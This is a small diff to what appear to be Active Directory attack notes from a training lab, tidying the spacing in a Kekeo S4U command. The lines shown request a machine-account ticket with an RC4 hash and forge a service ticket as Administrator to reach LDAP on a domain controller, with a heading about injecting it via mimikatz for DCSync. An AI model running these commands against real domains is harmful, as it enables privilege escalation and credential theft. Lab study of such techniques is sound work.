@@ -870,7 +870,7 @@ Tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:<hash>
 #### Requesting TGS
 No validation for the SPN specified
 ```
-Tgs::s4u /tgt:<kirbi file> /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL | ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
+Tgs::s4u /tgt:<kirbi file> /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
 ```
 
 #### Using mimikatz to inject TGS ticket and executing DCsync
